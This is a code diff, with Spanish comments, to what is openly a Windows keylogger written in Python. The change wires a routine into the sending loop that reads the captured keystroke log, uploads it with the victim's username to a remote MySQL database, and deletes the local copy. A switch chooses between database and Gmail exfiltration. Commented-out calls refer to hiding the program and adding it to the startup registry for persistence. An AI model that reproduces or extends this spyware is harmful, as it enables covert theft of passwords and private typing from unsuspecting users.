@@ -21,6 +21,7 @@ from winreg import *
 import datetime
 import os
 import yagmail
+import pymysql  # Lib connection mysql
 import shutil
 import time
 import threading # Hilos
@@ -314,19 +315,61 @@ def SendLog():
             print("[-] No se pudo envíar el Registro de teclas")
             return False
 
+    def SendDataBaseMySQL():
+        exito = False
+        try:    # Verifica si se inició corectamente
+            connection = pymysql.connect(
+            host= DB_HOST(), 
+            user = DB_USER(), 
+            password = DB_PASS(), 
+            database = DB_NAME())
+            cursor = connection.cursor()    # Objeto cursor
+            print("Se inició correctamente [DataBase]")
+            exito = True
+        except:
+            exito = False
+            print("Error al iniciar sesión [DataBase]")
 
+        def UpdateUser():
+            f = open (logKeyPath()+LogName(),'r')
+            data = f.read()
+            print(data)
+            f.close()
 
+            T = datetime.datetime.now()
+            currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
+            sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES('"+str(getuser())+"','"+currentTime+"','"+data+"')"    # Inserta nuevos datos 
+            #sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
+            try:
+                cursor.execute(sql) # Ejecuta virtual
+                connection.commit() # Se guardan virtual 
+                print("[Database] Se subieron los datos correctamente")
+                    # Elimina Registro Key
+                os.remove(logKeyPath()+LogName())
+            except:
+                print("[Database] Error al subir los datos")
 
-
-
-
-
-
-
+        if (exito): # Solo se ejecutará si se inició correctamente la base de datos
+            UpdateUser()
+        print("[DataBase]=> "+str(exito))
+    
     n = 1   # Para renombre los archivos
     while (True):
-        n = n+1
-        time.sleep(timeSend()*60) 
+        #time.sleep(timeSend()*60) # Tiempo de espera por minutos 
+        time.sleep(15) # borra esta linea
+        if VerificarConexion():
+            if (GMailOrDataBase() == 0):    # Send mail
+                n = n+1
+                
+                
+                pass
+            if (GMailOrDataBase() == 1):    # Send Data Base
+                SendDataBaseMySQL()
+        else:
+            print("[Send Log Key] sin conexión")
+
+
+
         if VerificarConexion(): # Continua solo si hay conexión a internet
             # Crea nombre del archivo
             nameFile = str(getuser())+" "+str(n)+".txt"
@@ -410,6 +453,10 @@ def DB_PORT():
 
 
 # ************ Fin Zone DATABASE ************* 
+def GMailOrDataBase():
+    return 1    # 1 = DataBase 
+                # 0 = Gmail
+                # (en las proximas actualizaciones , ambas a la vez)
 
 def timeSend(): # Tiempo de envío perzonalizado
     return 1 #Minutos                 <= Escoja su tiempo en minutos
@@ -426,47 +473,6 @@ def timeSend(): # Tiempo de envío perzonalizado
 
 # ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
-def SendDataBaseMySQL():
-    import pymysql  # Lib connection mysql
-    try:    # Verifica si se inició corectamente
-        connection = pymysql.connect(
-        host= DB_HOST(), 
-        user = DB_USER(), 
-        password = DB_PASS(), 
-        database = DB_NAME())
-        cursor = connection.cursor()    # Objeto cursor
-        print("Se inició correctamente [DataBase]")
-    except:
-        print("Error al iniciar sesión [DataBase]")
-
-    def UpdateUser():
-        f = open (logKeyPath()+LogName(),'r')
-        print(f.read())
-        f.close()
-
-        T = datetime.datetime.now()
-        currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
-        sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES('"+str(getuser())+"','"+currentTime+"','"+f.read()+"')"    # Inserta nuevos datos 
-        #sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
-        try:
-            cursor.execute(sql) # Ejecuta virtual
-            connection.commit() # Se guardan virtual 
-            print("[Database] Se subieron los datos correctamente")
-            # Elimina Registro Key
-            os.remove(logKeyPath()+LogName())
-        except:
-            print("[Database] Error al subir los datos")
-            pass
-        
-    UpdateUser()
-
-
-
-    print("Finalizo todo...")
-
-
-
-
 
 
 
@@ -478,7 +484,7 @@ def SendDataBaseMySQL():
 # Inicio multihilo
 if __name__ == '__main__':
 
-    SendDataBaseMySQL()
+    #SendDataBaseMySQL()
 
     #EscondeKey()    # Se replica dentro de la computadora
     #addStartup()    # Modifica registro de arranque
